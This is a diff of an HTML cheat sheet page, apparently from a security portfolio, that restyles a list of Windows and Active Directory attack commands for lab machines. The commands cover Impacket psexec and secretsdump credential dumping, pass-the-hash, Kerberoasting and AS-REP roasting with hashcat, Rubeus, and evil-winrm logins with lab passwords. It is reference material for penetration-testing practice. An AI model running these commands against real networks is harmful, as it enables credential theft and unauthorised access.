@@ -6,17 +6,19 @@
   <meta name="description" content="Windows / AD cheat sheet" />
   <title>Windows & AD Cheat Sheet</title>
   <link rel="stylesheet" href="/assets/css/writeups.css">
-  <nav class="cheatsheet-navbar">
-  <div class="nav-left">
-    <a href="index.html" class="nav-logo">Portfolio</a>
-  </div>
-  <ul class="nav-right">
-    <li><a href="../writeups/">Writeups</a></li>
-    <li><a href="cheatsheet.html" class="active">Cheatsheets</a></li>
-  </ul>
-</nav>
 </head>
-<body>
+<body class="cheatsheet">
+  <!-- moved nav into body and added cheatsheet class on body -->
+  <nav class="cheatsheet-navbar">
+    <div class="nav-left">
+      <a href="index.html" class="nav-logo">Portfolio</a>
+    </div>
+    <ul class="nav-right">
+      <li><a href="../writeups/">Writeups</a></li>
+      <li><a href="cheatsheet.html" class="active">Cheatsheets</a></li>
+    </ul>
+  </nav>
+
   <header class="site-header">
     <div class="wrap">
       <h1>Windows & Active Directory</h1>
@@ -32,110 +34,93 @@
     </div>
   </header>
 
-  <main class="wrap">
+  <main class="cheatsheet-content">
     <article>
 
       <h2>Impacket utilities</h2>
 
       <h3>mssqlclient.py</h3>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd1">Copy</button>
-        <pre><code id="wcmd1">mssqlclient.py manager/operator:operator@manager.htb -windows-auth</code></pre>
+        <pre><code>mssqlclient.py manager/operator:operator@manager.htb -windows-auth</code></pre>
       </div>
       <p>Useful commands inside mssqlclient: `enable_xp_cmdshell`, `xp_dirtree \\&lt;share&gt;` (can leak hashes via responder), SQL to list DBs etc.</p>
 
       <h3>psexec.py / psexec</h3>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd2">Copy</button>
-        <pre><code id="wcmd2">psexec.py -hashes &lt;NT HASH&gt;:&lt;NT HASH&gt; administrator@10.10.11.236</code></pre>
+        <pre><code>psexec.py -hashes &lt;NT HASH&gt;:&lt;NT HASH&gt; administrator@10.10.11.236</code></pre>
       </div>
 
       <div class="code">
-        <button class="copy-btn" data-target="wcmd3">Copy</button>
-        <pre><code id="wcmd3">impacket-psexec manager/administrator:'d0m@in4dminyeah!'@10.10.10.172</code></pre>
+        <pre><code>impacket-psexec manager/administrator:'d0m@in4dminyeah!'@10.10.10.172</code></pre>
       </div>
 
       <h3>secretsdump.py</h3>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd4">Copy</button>
-        <pre><code id="wcmd4">impacket-secretsdump -user-status -history -pwd-last-set administrator.htb/ethan@10.10.11.42</code></pre>
+        <pre><code>impacket-secretsdump -user-status -history -pwd-last-set administrator.htb/ethan@10.10.11.42</code></pre>
       </div>
 
       <div class="note">Dumping NTDS using local system boot key (if you have it):</div>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd5">Copy</button>
-        <pre><code id="wcmd5">impacket-secretsdump local -system system -ntds ntds.dit</code></pre>
+        <pre><code>impacket-secretsdump local -system system -ntds ntds.dit</code></pre>
       </div>
 
       <h2>Kerberos / Kerberoasting / Tickets</h2>
 
       <h3>Get TGT (impacket-getTGT)</h3>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd6">Copy</button>
-        <pre><code id="wcmd6">impacket-getTGT domain/svc_tgs:password -dc-ip &lt;dc_ip&gt;</code></pre>
+        <pre><code>impacket-getTGT domain/svc_tgs:password -dc-ip &lt;dc_ip&gt;</code></pre>
       </div>
 
       <h3>GetUserSPNs</h3>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd7">Copy</button>
-        <pre><code id="wcmd7">impacket-GetUserSPNs -request -dc-ip &lt;dc_ip&gt; domain/SVC_TGS -save -outputfile GetUserSPNs.out</code></pre>
+        <pre><code>impacket-GetUserSPNs -request -dc-ip &lt;dc_ip&gt; domain/SVC_TGS -save -outputfile GetUserSPNs.out</code></pre>
       </div>
 
       <h3>Crack Kerberoast TGS</h3>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd8">Copy</button>
-        <pre><code id="wcmd8">hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt</code></pre>
+        <pre><code>hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt</code></pre>
       </div>
 
       <h3>Ticket conversion</h3>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd9">Copy</button>
-        <pre><code id="wcmd9">impacket-ticketConverter ticket.kirbi ticket.ccache</code></pre>
+        <pre><code>impacket-ticketConverter ticket.kirbi ticket.ccache</code></pre>
       </div>
 
       <h2>Targeted Kerberoast</h2>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd10">Copy</button>
-        <pre><code id="wcmd10">python3 targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' -f hashcat</code></pre>
+        <pre><code>python3 targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' -f hashcat</code></pre>
       </div>
 
       <h2>AS-REP Roasting</h2>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd11">Copy</button>
-        <pre><code id="wcmd11">impacket-GetNPUsers -dc-ip &lt;dc_ip&gt; -request 'domain/username'</code></pre>
+        <pre><code>impacket-GetNPUsers -dc-ip &lt;dc_ip&gt; -request 'domain/username'</code></pre>
       </div>
 
       <div class="code">
-        <button class="copy-btn" data-target="wcmd12">Copy</button>
-        <pre><code id="wcmd12">hashcat -m 18200 svc.hash /usr/share/wordlists/rockyou.txt</code></pre>
+        <pre><code>hashcat -m 18200 svc.hash /usr/share/wordlists/rockyou.txt</code></pre>
       </div>
 
       <h2>Rubeus</h2>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd13">Copy</button>
-        <pre><code id="wcmd13">.\Rubeus.exe kerberoast /outfile:hashes.kerberoast</code></pre>
+        <pre><code>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast</code></pre>
       </div>
 
       <div class="code">
-        <button class="copy-btn" data-target="wcmd14">Copy</button>
-        <pre><code id="wcmd14">.\Rubeus.exe asreproast /nowrap</code></pre>
+        <pre><code>.\Rubeus.exe asreproast /nowrap</code></pre>
       </div>
 
       <h2>Evil-WinRM</h2>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd15">Copy</button>
-        <pre><code id="wcmd15">evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'</code></pre>
+        <pre><code>evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'</code></pre>
       </div>
 
       <div class="code">
-        <button class="copy-btn" data-target="wcmd16">Copy</button>
-        <pre><code id="wcmd16">evil-winrm -i 10.10.11.236 -H &lt;NT HASH&gt; -u administrator</code></pre>
+        <pre><code>evil-winrm -i 10.10.11.236 -H &lt;NT HASH&gt; -u administrator</code></pre>
       </div>
 
       <div class="note">Cert-based WinRM (5986):</div>
       <div class="code">
-        <button class="copy-btn" data-target="wcmd17">Copy</button>
-        <pre><code id="wcmd17">evil-winrm -S -i &lt;ip&gt; -c key.cert -k key.pem</code></pre>
+        <pre><code>evil-winrm -S -i &lt;ip&gt; -c key.cert -k key.pem</code></pre>
       </div>
 
       <h2>Notes</h2>
